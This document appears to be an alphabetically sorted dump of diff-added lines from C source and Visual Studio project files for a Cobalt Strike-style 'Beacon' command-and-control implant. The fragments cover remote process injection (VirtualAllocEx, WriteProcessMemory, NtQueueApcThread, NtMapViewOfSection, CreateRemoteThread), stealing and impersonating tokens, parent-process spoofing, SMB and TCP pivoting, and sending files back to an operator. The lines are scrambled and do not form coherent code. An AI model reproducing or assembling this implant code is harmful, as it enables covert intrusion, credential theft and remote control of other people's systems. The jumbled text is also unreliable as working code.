+"    <ClCompile Include=""thread.c"">"
+"    <ClCompile Include=""transform.c"" />"
+"    <ClCompile Include=""transform.c"">"
+"    <ClCompile Include=""utils.c"" />"
+"    <ClCompile Include=""utils.c"">"
+"    <ClCompile Include=""web_response.c"" />"
+"    <ClCompile Include=""web_response.c"">"
+"    <ClInclude Include=""api.h"" />"
+"    <ClInclude Include=""api.h"">"
+"    <ClInclude Include=""argument.h"" />"
+"    <ClInclude Include=""argument.h"">"
+"    <ClInclude Include=""beacon.h"" />"
+"    <ClInclude Include=""beacon.h"">"
+"    <ClInclude Include=""callback.h"" />"
+"    <ClInclude Include=""callback.h"">"
+"    <ClInclude Include=""channel.h"" />"
+"    <ClInclude Include=""channel.h"">"
+"    <ClInclude Include=""command.h"" />"
+"    <ClInclude Include=""command.h"">"
+"    <ClInclude Include=""crypto.h"" />"
+"    <ClInclude Include=""crypto.h"">"
+"    <ClInclude Include=""download.h"" />"
+"    <ClInclude Include=""download.h"">"
+"    <ClInclude Include=""error.h"" />"
+"    <ClInclude Include=""error.h"">"
+"    <ClInclude Include=""filesystem.h"" />"
+"    <ClInclude Include=""filesystem.h"">"
+"    <ClInclude Include=""identity.h"" />"
+"    <ClInclude Include=""identity.h"">"
+"    <ClInclude Include=""inline_execute_object.h"" />"
+"    <ClInclude Include=""inline_execute_object.h"">"
+"    <ClInclude Include=""job.h"" />"
+"    <ClInclude Include=""job.h"">"
+"    <ClInclude Include=""link.h"" />"
+"    <ClInclude Include=""link.h"">"
+"    <ClInclude Include=""logger.h"" />"
+"    <ClInclude Include=""logger.h"">"
+"    <ClInclude Include=""macros.h"" />"
+"    <ClInclude Include=""macros.h"">"
+"    <ClInclude Include=""metadata.h"" />"
+"    <ClInclude Include=""metadata.h"">"
+"    <ClInclude Include=""network.h"" />"
+"    <ClInclude Include=""network.h"">"
+"    <ClInclude Include=""pch.h"" />"
+"    <ClInclude Include=""pch.h"">"
+"    <ClInclude Include=""pipe.h"" />"
+"    <ClInclude Include=""pipe.h"">"
+"    <ClInclude Include=""powershell.h"" />"
+"    <ClInclude Include=""powershell.h"">"
+"    <ClInclude Include=""process.h"" />"
+"    <ClInclude Include=""process.h"">"
+"    <ClInclude Include=""protocol.h"" />"
+"    <ClInclude Include=""protocol.h"">"
+"    <ClInclude Include=""self.h"" />"
+"    <ClInclude Include=""self.h"">"
+"    <ClInclude Include=""settings.h"" />"
+"    <ClInclude Include=""settings.h"">"
+"    <ClInclude Include=""spawn.h"" />"
+"    <ClInclude Include=""spawn.h"">"
+"    <ClInclude Include=""stage.h"" />"
+"    <ClInclude Include=""stage.h"">"
+"    <ClInclude Include=""strategy.h"" />"
+"    <ClInclude Include=""strategy.h"">"
+"    <ClInclude Include=""strategy_default.c"">"
+"    <ClInclude Include=""strategy_failover.c"">"
+"    <ClInclude Include=""strategy_random.c"">"
+"    <ClInclude Include=""thread.h"" />"
+"    <ClInclude Include=""thread.h"">"
+"    <ClInclude Include=""transform.h"" />"
+"    <ClInclude Include=""transform.h"">"
+"    <ClInclude Include=""utils.h"" />"
+"    <ClInclude Include=""utils.h"">"
+"    <ClInclude Include=""web_response.h"" />"
+"    <ClInclude Include=""web_response.h"">"
+"    <Filter Include=""Header Files"">"
+"    <Filter Include=""Resource Files"">"
+"    <Filter Include=""Source Files"">"
+"    <Import Project=""$(UserRootDir)"
+"    <ProjectConfiguration Include=""Debug"
+"    <ProjectConfiguration Include=""Release"
+"    <ProjectReference Include="".."
+"    The contents are masked by default, and BOFs must unprotect the entry"
+"    VirtualFree(img, 0, MEM_RELEASE)"
+"    const bool isConnectionFailed,"
+"    const bool isConnectionStrategyFailed, STRATEGY strategy)"
+"    if (AdjustMemoryPermissions(img, codeLength))"
+"    memcpy(img, code, codeLength)"
+"    memset(code, 0, codeLength)"
+"  <Import Project=""$(VCTargetsPath)"
+"  <ImportGroup Label=""ExtensionSettings"">"
+"  <ImportGroup Label=""ExtensionTargets"">"
+"  <ImportGroup Label=""PropertySheets"" Condition=""'$(Configuration)"
+"  <ImportGroup Label=""Shared"">"
+"  <ItemDefinitionGroup Condition=""'$(Configuration)"
+"  <ItemGroup Label=""ProjectConfigurations"">"
+"  <PropertyGroup Condition=""'$(Configuration)"
+"  <PropertyGroup Label=""Globals"">"
+"  <PropertyGroup Label=""UserMacros"" />"
+" !TerminateProcess(hProcess, 0)) {"
+" !Thread32First(hSnapshot, "
+" ""%s (admin)"" : ""%s"", userInfo)"
+" ""x86"" : arch,"
+" 'A' : 'a', transform->transformed, transformedLength, transform->temp, transform->outputLength)"
+" 'A' : 'a',"
+" , lpFileName)"
+" // Information: Computer name, user name, executable name"
+" // retrieve the original item, not the cache"
+" 2. The "".h"" file for the current source file"
+" @return Returns TRUE if the identity-related operations were successful, otherwise FALSE."
+" @return Returns TRUE if the username is successfully retrieved, FALSE otherwise."
+" @return TRUE if Beacon is in a high-integrity context, FALSE otherwise."
+" BaseAddress, _In_ ULONG_PTR ZeroBits, _In_ SIZE_T CommitSize, _Inout_opt_ PLARGE_INTEGER SectionOffset, _Inout_ PSIZE_T ViewSize, _In_ SECTION_INHERIT InheritDisposition, _In_ ULONG AllocationType, _In_ ULONG Win32Protect)"
+" CALLBACK_PENDING : CALLBACK_PROCESS_LIST, cbBuffer, cbLength)"
+" CREATE_UNICODE_ENVIRONMENT,"
+" Coverlet is a free, cross platform Code Coverage Tool"
+" FN_KERNEL32_CREATETHREAD)(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ __drv_aliasesMem LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId)"
+" FN_KERNEL32_GETPROCADDRESS)(_In_ HMODULE hModule, _In_ LPCSTR lpProcName)"
+" FN_KERNEL32_ISWOW64PROCESS)(_In_ HANDLE hProcess, _Out_ PBOOL Wow64Process)"
+" FN_KERNEL32_VIRTUALALLOC)(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect)"
+" FN_KERNEL32_VIRTUALPROTECT)(_In_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flNewProtect, _Out_ PDWORD lpflOldProtect)"
+" FN_NTDLL_NTMAPVIEWOFSECTION)(_In_ HANDLE SectionHandle, _In_ HANDLE ProcessHandle, _Inout_ PVOID"
+" FN_NTDLL_NTQUEUEAPCTHREAD)(_In_ HANDLE ThreadHandle, _In_ PVOID ApcRoutine, _In_ PVOID ApcRoutineContext OPTIONAL, _In_ PVOID ApcStatusBlock OPTIONAL, _In_ PVOID ApcReserved OPTIONAL)"
+" FN_NTDLL_RTLCREATEUSERTHREAD)(_In_ HANDLE ProcessHandle, _In_opt_ PSECURITY_DESCRIPTOR SecurityDescriptor, _In_ BOOLEAN CreateSuspended, _In_opt_ ULONG StackZeroBits, _In_opt_ SIZE_T StackReserve, _In_opt_ SIZE_T StackCommit, _In_ PVOID StartAddress, _In_opt_ PVOID Parameter, _Out_opt_ PHANDLE ThreadHandle, _Out_opt_ PCLIENT_ID ClientId)"
+" GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OPEN_NO_RECALL, NULL)"
+" GENERIC_WRITE, 0, NULL, OPEN_EXISTING, flags, NULL)"
+" Ignore Visual Studio temporary files, build results, and"
+" InjectViaNtMapViewOfSection(HANDLE handle, DWORD pid, const char"
+" InjectViaVirtualAllocEx(HANDLE hProcess, DWORD pid, const char"
+" InternetQueryDataAvailable(hInternet, "
+" JobRegisterPipe(HANDLE hRead, int pid32, int callbackType, char"
+" MEM_RESERVE, PAGE_EXECUTE_READWRITE)"
+" MEM_RESERVE, S_PROCINJ_PERMS_I)"
+" Note: Comment the next line if you want to checkin your web deploy settings,"
+" OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, "
+" PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID)"
+" PROCESS_VM_READ, FALSE, pid)"
+" STRLEN(""sysnative"")"
+" STRLEN(""system32""), aux, strlen(aux) "
+" S_PROCINJ_TRANSFORM_X64 : S_PROCINJ_TRANSFORM_X86, 256)"
+" Since there are multiple workflows, uncomment next line to ignore bower_components"
+" TOKEN_ADJUST_PRIVILEGES, "
+" This function is used for adjusting the command line of a process by allocating a new buffer,"
+" WebResponseInit(SOCKET socket, char"
+" WriteProcessMemory(injection->process, lpApcContext, pAllocedData, dwSize, "
+" a1, const char"
+" a2, BOOL isDirectory)"
+" acceptTypes[] = { """
+" accountName, int length) {"
+" api, PROC newFunction)"
+" are conflicts (Merging from VS is not affected by the settings below, in VS"
+" arg, int a_len)"
+" arg,"
+" args = BeaconDataPtr(locals, MAX_ARGS)"
+" argument, int argumentLength, char"
+" attempts,"
+" base64_decode : base64url_decode)(recoverable, recoverableLength, temp, "
+" bind(sock, (struct sockaddr"
+" buff, int len)"
+" buffer, int length) {"
+" buffer, int length)"
+" buffer, int length, BOOL x86)"
+" buffer, int length, HANDLE hToken, formatp"
+" buffer, int length, char"
+" buffer, int length, int ipAddress)"
+" buffer, int length, int type, BOOL isHeap, void("
+" buffer, int size) {"
+" buffer, int size)"
+" buffer, int size, BOOL impersonate, BOOL isMsgMode)"
+" buffer, int size, BOOL x86, BOOL ignoreToken)"
+" checkin your Azure Web App publish settings, but sensitive information contained"
+" cmd = BeaconDataPtr(locals, 0x4000)"
+" cmd = BeaconDataPtr(locals, MAX_CMD)"
+" cmd, const WCHAR"
+" cmd, int cmdLength, STARTUPINFO"
+" code, char"
+" computerName = BeaconDataPtr(parser, MAX_COMPUTER_NAME)"
+" content, int contentLength)"
+" converting the new command to wide characters, and writing it to the process memory."
+" data = BeaconDataPtr(parser, size)"
+" data, const int maxGet)"
+" data, int len)"
+" data, int size)"
+" data, int size, BOOL x86)"
+" data, int size, BOOL x86, BOOL ignoreToken)"
+" description = BeaconDataPtr(locals, MAX_DESCRIPTION)"
+" description, BOOL isMsgMode)"
+" description, int descriptionLength, BOOL x86, BOOL ignoreToken)"
+" domain = BeaconDataPtr(locals, 0x400)"
+" domain = BeaconDataPtr(locals, MAX_DOMAIN)"
+" domain = strtok(NULL, "",""))"
+" domain = strtok(gFailoverDomainsStr, "","")"
+" domain, char"
+" domains,"
+" download, int chunkMaxSize)"
+" dst = BeaconDataPtr(locals, MAX_DST)"
+" dst, int max)"
+" dynamicFunction = FindOrAddDynamicFunction(api, lpProc)"
+" entryPoint))(bytes, bytesPair.size)"
+" except build/, which is used as an MSBuild target."
+" executable = ""<unknown name>"""
+" existingFileName = BeaconDataPtr(locals, MAX_EXISTING_FILENAME)"
+" expanded = BeaconDataPtr(locals, MAX_EXPANDED)"
+" expanded, size_t size, BOOL x86)"
+" expandedCmd = BeaconDataPtr(locals, MAX_EXPANDED_CMD)"
+" expandedFull = BeaconDataPtr(locals, MAX_EXPANDED_FULL)"
+" extendedCmd, const char"
+" file = fopen(lpFileName, ""rb"")"
+" file = fopen(lpFileName, mode)"
+" file, containing macros for the C2 Profile, is .gitignored (and thus not available), as users are expected to complete it according to their preferences. Once you have your "
+" fileName = BeaconDataPtr(parser, MAX_FILE_NAME)"
+" filename, WIN32_FIND_DATAA"
+" findData.nFileSizeLow,"
+" fmt, ...)"
+" format, char "
+" format, char value)"
+" format, char"
+" format, int "
+" format, int maxsz)"
+" format, int value)"
+" format, int"
+" format, short value)"
+" getUri, SESSION"
+" header = ProtocolHeaderGet(S_SMB_FRAME_HEADER, 0, "
+" header = ProtocolHeaderGet(S_SMB_FRAME_HEADER, length, "
+" header = ProtocolHeaderGet(S_TCP_FRAME_HEADER, 0, "
+" header = ProtocolHeaderGet(S_TCP_FRAME_HEADER, length, "
+" i, sizeof(char), 0)"
+" img = VirtualAlloc(NULL, codeLength, MEM_COMMIT "
+" img, char"
+" in, const int inlen, char"
+" in, int inlen, char"
+" info = BeaconDataPtr(parser, MAX_INFO)"
+" injection, CHAR"
+" injection, LPVOID lpStartAddress, LPVOID lpParameter)"
+" injection, char"
+" injection, const char"
+" intervention with every merge. To do so, just uncomment the entries below"
+" key, void "
+" length, "
+" listen(sock, backlog) == SOCKET_ERROR)"
+" lpApcContext = VirtualAllocEx(injection->process, NULL, dwSize, MEM_COMMIT "
+" lpBuffer = BeaconDataPtr(locals, MAX_BUFFER)"
+" lpCommandLine = BeaconDataPtr(parser, 0x4000)"
+" lpCurrentDirectory = BeaconDataPtr(parser, 0x400)"
+" lpDomain = BeaconDataPtr(parser, 0x400)"
+" lpDomain, char"
+" lpDst, size_t size) {"
+" lpDst, size_t size)"
+" lpFileName = BeaconDataPtr(locals, MAX_FILENAME)"
+" lpPassword = BeaconDataPtr(parser, 0x400)"
+" lpPassword, PROCESS_INFORMATION"
+" lpSrc, char"
+" lpStartAddress, DWORD offset, LPVOID lpParameter)"
+" lpStartAddress, LPVOID lpParameter)"
+" lpUsername = BeaconDataPtr(parser, 0x400)"
+" lpUsername, char"
+" newFileName = BeaconDataPtr(locals, MAX_NEW_FILENAME)"
+" note: we don't force memzero the buffer explicitly, as free is already overwritten to do that "
+" offset, lpParameter))"
+" offset, lpParameter, lpModuleName, lpProcName, ordinal))"
+" original = BeaconDataPtr(locals, MAX_ORIGINAL)"
+" osVersionInfo = BeaconDataPtr(parser, sizeof(OSVERSIONINFOA))"
+" out, const int outlen)"
+" out, int outlen)"
+" out, int"
+" pInfo, char "
+" pInfo, char"
+" pSection, unsigned long offsetInSection)"
+" param, recoverableLength)"
+" paramLength, transform->transformed, transformedLength)"
+" parser, char "
+" parser, char"
+" parser, int "
+" parser, int size)"
+" parser, int"
+" parser, sizedbuf"
+" password = BeaconDataPtr(locals, 0x400)"
+" password = BeaconDataPtr(locals, MAX_PASSWORD)"
+" payload, int pLen,"
+" payload, int p_len, int p_offset, char "
+" payload, int p_len, int p_offset, char"
+" payload, int p_len, int p_offset,"
+" payload, int payloadLength, char"
+" payload, int size) {"
+" payload, int size)"
+" payload, int size, int pOffset, char"
+" pi, HANDLE hRead, HANDLE hWrite, char"
+" pi, int pid)"
+" pipe, DWORD flags)"
+" position = strrchr(fileName, '"
+" processInfo, EXPANDED_CMD"
+" processInfo, HANDLE hProcess, int pid, char"
+" processInfo, int creationFlags, BOOL ignoreToken)"
+" processInfo, int creationFlags, BOOL ignoreToken, int parentPid)"
+" protocol, DWORD waitTime, int iterWaitTime)"
+" protocol, HANDLE handle)"
+" protocol, SOCKET socket)"
+" protocol, char"
+" protocol, int pivotHints)"
+" ptr = BeaconDataPtr(parser, parser->length)"
+" pubkey, char"
+" recover, char"
+" recoverable, int recoverableLength, int maxGet)"
+" relocation, char"
+" request_profile,"
+" response,"
+" result = strtok(NULL, "","")"
+" runUnderConfig, WCHAR"
+" runUnderConfig, int parentPid)"
+" runnableCmd = BeaconDataPtr(locals, MAX_RUNNABLE_CMD)"
+" session, char"
+" session,"
+" setting, int headerSize, int"
+" si, PROCESS_INFORMATION "
+" si, PROCESS_INFORMATION"
+" size, 0x2000)"
+" sizeof(gCbcKey), sizeof(gHmacKey))"
+" sizeof(int), size)"
+" sleepTime,"
+" src = BeaconDataPtr(locals, MAX_SRC)"
+" src, wchar_t "
+" src, wchar_t"
+" startupInfo, PROCESS_INFORMATION"
+" str, int aLen)"
+" strcmp(expanded, current->expandedCmd) == 0)"
+" strcmp(lpCurrentFindFileData->cFileName, ""..""))"
+" strstr(cmd, current->expandedCmd) == cmd)"
+" substr = strstr(cmd, ""sysnative"")"
+" target, short port)"
+" template ready, feel free to share and contribute."
+" text, int len)"
+" to a newer Visual Studio version. Backup files are not needed,"
+" token = strtok(NULL, "",""))"
+" token = strtok(gRandomDomainsArray, "","")"
+" total, length - total, 0)"
+" total, payload "
+" total, size - total, "
+" total, toWrite, "
+" totalBytesRead, MAX_READ, "
+" totalRead, 1, toRead, download->file)"
+" totalRead, length - totalRead, "
+" totalRead, length - totalRead, 0)"
+" totalWrote, toWrite, "
+" transform, int size)"
+" transform,"
+" transformedLength, param, paramLength)"
+" userName = BeaconDataPtr(parser, MAX_USER_NAME)"
+" username = BeaconDataPtr(locals, 0x400)"
+" username = BeaconDataPtr(locals, MAX_USERNAME)"
+" username, char"
+" webResponse = WebResponseInit(acceptSocket, content, contentLength)"
+""", NULL }"
+""", filename)"
+"""GET"", "
+"""HTTP/1.1 200 OK"
+"%s"", a1, a2)"
+"%s"", domain, name)"
+"%s"", filename, findData->cFileName)"
+"%s"", param)"
+"%s"", transform->uriParams, param)"
+"%s: %d"", cmd, domain, username, lastError)"
+"%s: %s"", cmd, domain, username, LAST_ERROR_STR(lastError))"
+"%s=%s"", param, transform->transformed)"
+"%s=%s"", transform->uriParams, param, transform->transformed)"
+"(_NtQueueApcThread)(hThread, lpApcContext->payload, lpApcContext, NULL, NULL)"
+")GetProcAddress(hModule, lpProcName)"
+")VirtualAlloc(NULL, dwSize, MEM_COMMIT "
+")dynamicFunctionPtr, 0)"
+")gRouteAux, size)"
+")in, 16, mask, "
+")pubkey, 162, "
+")tokenInfo)->User.Sid, name, "
+")username, 1024))"
+", DWORD, LPPROC_THREAD_ATTRIBUTE_LIST, STARTUPINFO"
+", char"
+", int)"
+", int))(img "
+", int, int)"
+", j "
+"- Visual Studio: The project is built using Visual Studio, not Visual Studio Code."
+"- [libtommath](https://github.com/libtom/libtommath): A fast, portable number-theoretic multiple-precision integer library."
+".allocType = type,"
+".creationTime = GetTickCount(),"
+".file = file,"
+".id = id,"
+".isHeap = isHeap,"
+".lastActive = 0,"
+".port = port,"
+".ptr = buffer,"
+".ptr = gRecords[i].record.ptr,"
+".remainingData = fileSize,"
+".socket = (HANDLE)socket,"
+".state = state,"
+".timeoutPeriod = timeoutPeriod,"
+".type = type,"
+"// Calculate the results and store them in ""out"""
+"// Extract the upper and lower nibbles from ""in"""
+"// Format the username in the format ""domain"
+"// Function added, return its pointer"
+"// Function found, return its pointer"
+"// If gJobs is not empty, iterate through the list"
+"// If no empty slot was found, return NULL"
+"// If the file is not found, wait for it to be created"
+"// If there an already stolen token, close its handle."
+"// Revert to the self security context (that is, drop the stolen token from the current thread)"
+"// This forces the programmer to not use 'auto' keyword ever, otherwise the compiler will throw an error."
+"// if the size of the buffer is too small, return 0"
+"// look for the substring ""sysnative"" in cmd"
+"3. Ensure that the required dependencies (libtommath, libtomcrypt) are properly configured and linked with the project."
+"<Project DefaultTargets=""Build"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"APC_ROUTINE_CONTEXT data = (APC_ROUTINE_CONTEXT){ lpStartAddress, lpParameter, CreateThread, FALSE }"
+"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER"
+"ArgumentAdd(buffer, size)"
+"ArgumentRemove(buffer, size)"
+"BOOL   BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO "
+"BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO"
+"BOOL ExecuteViaCreateRemoteThread(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter)"
+"BOOL ExecuteViaCreateRemoteThread_s(DWORD option, HANDLE hProcess, LPVOID lpAddress, LPVOID lpParameter, LPCSTR lpModuleName, LPCSTR lpProcName, DWORD ordinal)"
+"BOOL ExecuteViaRtlCreateUserThread(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter)"
+"BOOL GetAccountNameFromToken(HANDLE hProcess, char"
+"BOOL IdentityGetUserInfo(HANDLE hToken, char"
+"BOOL PipeConnect(LPCSTR lpFileName, HANDLE"
+"BOOL PipeWaitForData(HANDLE hNamedPipe, DWORD waitTime, int iterWaitTime)"
+"BOOL ProtocolSmbPipeWrite(HANDLE hFile, char"
+"BOOL ProtocolTcpSocketWrite(SOCKET channel, char"
+"BOOL RunAsUserInternal(LPCCH domain, LPCCH username, LPCCH password, LPCCH cmd, int creationFlags, LPPROCESS_INFORMATION lpProcessInfo)"
+"BOOL SpawnAsUserInternal(BOOL x86, char"
+"BOOL SpawnUnderInternal(BOOL x86, BOOL ignoreToken, STARTUPINFO"
+"BOOL UpdateParentProcessContext(PRUN_UNDER_CONTEXT context, DWORD parentPid, LPPROC_THREAD_ATTRIBUTE_LIST attributeList, STARTUPINFO"
+"BOOL result = OpenProcessToken(hProcess, TOKEN_QUERY, "
+"Beacon.vcxproj"", ""{95502B5E-5763-4EC5-A64C-1E9E33409E2F}"""
+"BeaconCleanupProcess,"
+"BeaconDataExtract,"
+"BeaconDataInt,"
+"BeaconDataLength,"
+"BeaconDataLengthAndString(parser, "
+"BeaconDataParse(parser, buffer, size)"
+"BeaconDataParse,"
+"BeaconDataPtr,"
+"BeaconDataShort,"
+"BeaconDataStringCopy(parser, buffer, size)"
+"BeaconErrorD(ERROR_ADJUST_ARGUMENTS_FAILED, lastError)"
+"BeaconErrorD(ERROR_ADJUST_PERMISSIONS_FAILED, lastError)"
+"BeaconErrorD(ERROR_ALLOC_SECTION_FAILED, lastError)"
+"BeaconErrorD(ERROR_CONNECT_TO_PIPE_FAILED, lastError)"
+"BeaconErrorD(ERROR_CONNECT_TO_TARGET_FAILED, error)"
+"BeaconErrorD(ERROR_COPY_FAILED, lastError)"
+"BeaconErrorD(ERROR_CREATE_TOKEN_FAILED, error)"
+"BeaconErrorD(ERROR_IMPERSONATE_TOKEN_FAILED, error)"
+"BeaconErrorD(ERROR_LENGTHY_WIDECHAR_COMMAND, runUnderConfig->cmdLength)"
+"BeaconErrorD(ERROR_MOVE_FAILED, lastError)"
+"BeaconErrorD(ERROR_PARENT_PROCESS_NOT_IN_SAME_SESSION, gParentPid)"
+"BeaconErrorD(ERROR_POST_IMPERSONATE_TOKEN_FAILED, lastError)"
+"BeaconErrorD(ERROR_SOCKET_CREATE_BIND_FAILED, port)"
+"BeaconErrorD(ERROR_UPDATE_PROC_THREAD_ATTRIBUTE_LIST_FAILED, lastError)"
+"BeaconErrorD(ERROR_UPLOAD_OPEN_FAILED, lastError)"
+"BeaconErrorD(ERROR_WRITE_TO_PROC_MEMORY_FAILED, lastError)"
+"BeaconErrorD(type, pid)"
+"BeaconErrorD,"
+"BeaconErrorDD(ERROR_CREATE_REMOTE_THREAD_FAILED, injection->pid, lastError)"
+"BeaconErrorDD(ERROR_DUPLICATE_TOKEN_FAILED, pid, lastError)"
+"BeaconErrorDD(ERROR_IMPERSONATE_LOGGED_ON_USER_FAILED, pid, lastError)"
+"BeaconErrorDD(ERROR_IMPERSONATE_STEAL_TOKEN_FAILED, pid, lastError)"
+"BeaconErrorDD(ERROR_KILL_FAILED, pid, lastError)"
+"BeaconErrorDD(ERROR_LOCAL_ALLOC_FAILED, dwSize, lastError)"
+"BeaconErrorDD(ERROR_OPEN_PROCESS_FAILED, pid, lastError)"
+"BeaconErrorDD(ERROR_OPEN_PROCESS_TOKEN_FAILED, pid, lastError)"
+"BeaconErrorDD(ERROR_SET_PID_FAILED, parentPid, lastError)"
+"BeaconErrorDD,"
+"BeaconErrorDS(ERROR_LIST_OPEN_FAILED, lastError, filename)"
+"BeaconErrorDS(ERROR_SPAWN_PROCESS_AS_USER_FAILED, lastError, execution->cmd)"
+"BeaconErrorDS(ERROR_SPAWN_PROCESS_FAILED, lastError, execution->cmd)"
+"BeaconErrorDS(ERROR_SPAWN_TOKEN_AND_CREDS, lastError, runUnderConfig->cmd)"
+"BeaconErrorDS(ERROR_STAGER_VIA_TCP_CONNECTION_FAILED, text, lastError)"
+"BeaconErrorDS(type, lastError, runUnderConfig->cmd)"
+"BeaconErrorNA,"
+"BeaconErrorPrintf(ERROR_RUN_AS_USER_FAILED, ""%s as %s"
+"BeaconErrorS(ERROR_DOWNLOAD_OPEN_FAILED, lpFileName)"
+"BeaconErrorS(ERROR_DOWNLOAD_PATH_TOO_LONG, lpFileName)"
+"BeaconErrorS(ERROR_DOWNLOAD_SIZE_CHECK_FAILED, lpFileName)"
+"BeaconFormatAlloc,"
+"BeaconFormatAppend(format, (char"
+"BeaconFormatAppend,"
+"BeaconFormatFree,"
+"BeaconFormatInt,"
+"BeaconFormatPrintf(locals, ""%s"
+"BeaconFormatPrintf,"
+"BeaconFormatReset,"
+"BeaconFormatToString,"
+"BeaconFormatUse(format, buffer, maxsz)"
+"BeaconGetSpawnTo,"
+"BeaconInjectProcess(hProcess, pid, payload, len, payloadOffset, NULL, 0)"
+"BeaconInjectProcess,"
+"BeaconInjectProcessInternal(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len)"
+"BeaconInjectProcessInternal(pInfo, pInfo->hProcess, pInfo->dwProcessId, payload, p_len, p_offset, arg, a_len)"
+"BeaconInjectTemporaryProcess,"
+"BeaconIsAdmin,"
+"BeaconOutput(CALLBACK_ACCEPT, cbData, cbLength)"
+"BeaconOutput(CALLBACK_CLOSE, buffer, sizeof(channelId))"
+"BeaconOutput(CALLBACK_CLOSE, buffer, sizeof(id))"
+"BeaconOutput(CALLBACK_CLOSE, gChannelBuffer, sizeof(int))"
+"BeaconOutput(CALLBACK_DEAD, NULL, 0)"
+"BeaconOutput(CALLBACK_FILE, cbBuffer, cbLength)"
+"BeaconOutput(CALLBACK_FILE_CLOSE, (char"
+"BeaconOutput(CALLBACK_FILE_WRITE, (char"
+"BeaconOutput(CALLBACK_JOBS, buffer, size)"
+"BeaconOutput(CALLBACK_OUTPUT, buffer, size)"
+"BeaconOutput(CALLBACK_OUTPUT, data, size)"
+"BeaconOutput(CALLBACK_PENDING, data, size)"
+"BeaconOutput(CALLBACK_PING, (char"
+"BeaconOutput(CALLBACK_PIPE_CLOSE, (char"
+"BeaconOutput(CALLBACK_PIPE_OPEN, gLinks[i].callbackData, gLinks[i].callbackLength)"
+"BeaconOutput(CALLBACK_PIPE_OPEN, openLink->callbackData, openLink->callbackLength)"
+"BeaconOutput(CALLBACK_PIPE_PING, (char"
+"BeaconOutput(CALLBACK_PIPE_READ, (char"
+"BeaconOutput(CALLBACK_PWD, data, length)"
+"BeaconOutput(CALLBACK_READ, gChannelBuffer, size "
+"BeaconOutput(CALLBACK_TOKEN_GETUID, uidString, strlen(uidString))"
+"BeaconOutput(CALLBACK_TOKEN_STOLEN, accountName, strlen(accountName))"
+"BeaconOutput(CALLBACK_TOKEN_STOLEN, buffer, strlen(buffer))"
+"BeaconOutput(CALLBACK_TOKEN_STOLEN, username, strlen(username))"
+"BeaconOutput(type, "
+"BeaconOutput,"
+"BeaconPrintf,"
+"BeaconRevertToken,"
+"BeaconSpawnTemporaryProcess,"
+"BeaconUseToken,"
+"BlockDlls(buffer, size)"
+"ChannelAdd(sock, channelId, 180000, CHANNEL_TYPE_CONNECT, 0, CHANNEL_STATE_1)"
+"ChannelAdd(sock, channelId, 30000, CHANNEL_TYPE_CONNECT, 0, CHANNEL_STATE_2)"
+"ChannelAdd(sock, id, 180000, CHANNEL_TYPE_LISTEN, port, CHANNEL_STATE_2)"
+"ChannelAdd(sock, newId, 0, CHANNEL_TYPE_BIND, port, CHANNEL_STATE_2)"
+"ChannelAdd(sock, newId, 0, CHANNEL_TYPE_TCP_PIVOT, port, CHANNEL_STATE_2)"
+"ChannelClose(buffer, size)"
+"ChannelConnect(buffer, size)"
+"ChannelLSocketBind(buffer, size, 0)"
+"ChannelLSocketBind(buffer, size, LOCALHOST)"
+"ChannelLSocketClose(buffer, size)"
+"ChannelLSocketTcpPivot(buffer, size)"
+"ChannelListen(buffer, size)"
+"ChannelSend(buffer, size)"
+"CreateDirectoryA(path, NULL)"
+"CreateThreadEx(WebResponseThread, webResponse)"
+"DWORD nSize = ExpandEnvironmentStringsA(lpSrc, NULL, 0)"
+"DownloadCancel(buffer, size)"
+"DownloadDo(buffer, size)"
+"DownloadFileChunk(download, chunkMaxSize)"
+"DuplicateHandle(GetCurrentProcess(), si->hStdError, hProcess, "
+"DuplicateHandle(GetCurrentProcess(), si->hStdOutput, hProcess, "
+"EncryptSessionData(S_PUBKEY, format.original, format.length, gSession.data, "
+"Execute(buffer, size)"
+"ExpandEnvironmentStrings_s(buffer, expanded, MAX_EXPANDED)"
+"ExpandEnvironmentStrings_s(expandedFull, argument->expandedFullCmd, MAX_EXPANDED_FULL)"
+"ExpandEnvironmentStrings_s(original, argument->expandedCmd, MAX_EXPANDED)"
+"ExpandEnvironmentStrings_s(original, expanded, MAX_EXPANDED)"
+"ExpandEnvironmentStrings_s(runnableCmd, expandedCmd, MAX_EXPANDED_CMD)"
+"FD_SET((SOCKET)channel->socket, "
+"FN_KERNEL32_ISWOW64PROCESS _IsWow64Process = (FN_KERNEL32_ISWOW64PROCESS)GetProcAddress(hModule, ""IsWow64Process"")"
+"FN_NTDLL_NTMAPVIEWOFSECTION _NtMapViewOfSection = (FN_NTDLL_NTMAPVIEWOFSECTION)GetProcAddress(hModule, ""NtMapViewOfSection"")"
+"FN_NTDLL_NTQUEUEAPCTHREAD _NtQueueApcThread = (FN_NTDLL_NTQUEUEAPCTHREAD)GetProcAddress(hModule, ""NtQueueApcThread"")"
+"FN_NTDLL_RTLCREATEUSERTHREAD _RtlCreateUserThread = (FN_NTDLL_RTLCREATEUSERTHREAD)GetProcAddress(hModule, ""RtlCreateUserThread"")"
+"FilesystemCd(buffer, size)"
+"FilesystemCopy(buffer, size)"
+"FilesystemDrives(buffer, size)"
+"FilesystemFindAndProcess(lpFileName, findData)"
+"FilesystemList(buffer, size)"
+"FilesystemMkdir(buffer, size)"
+"FilesystemMove(buffer, size)"
+"FilesystemRemove(buffer, size)"
